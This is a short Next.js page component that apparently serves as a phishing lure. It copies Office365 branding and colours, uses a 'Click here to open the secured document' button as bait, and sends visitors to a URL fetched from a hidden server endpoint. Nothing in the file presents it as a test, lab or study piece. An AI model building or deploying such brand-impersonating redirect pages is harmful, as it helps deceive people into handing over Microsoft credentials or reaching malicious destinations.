import { useRouter } from 'next/router';
import Image from 'next/image';
import logo from '../public/logo.png';  // Importing Office365 logo
import logo2 from '../public/logo2.png'; // Importing button icon

export default function Home() {
  const router = useRouter();

  const handleRedirect = async () => {
    try {
      const res = await fetch('/api/getRedirectUrl'); // Fetch secure redirect URL
      const data = await res.json();
      if (data?.url) {
        window.location.href = data.url; // Redirect securely
      }
    } catch (error) {
      console.error('Failed to fetch redirect URL', error);
    }
  };

  return (
    <div style={{ textAlign: 'center', padding: '50px' }}>
      <h1>Proceed to Office365</h1>
      <Image src={logo} alt="Office365 Logo" width={150} height={150} priority />
      <br />
      <button
        onClick={handleRedirect}
        style={{
          marginTop: '20px',
          padding: '15px 25px',
          fontSize: '16px',
          cursor: 'pointer',
          border: 'none',
          backgroundColor: '#0078D4',
          color: '#fff',
          display: 'flex',
          alignItems: 'center',
          gap: '10px',
          borderRadius: '5px',
          alignItems: 'center',
        }}
      >
        <Image src={logo2} alt="Secure Document Icon" width={20} height={20} />
        Click here to open the secured document
      </button>
    </div>
  );
}
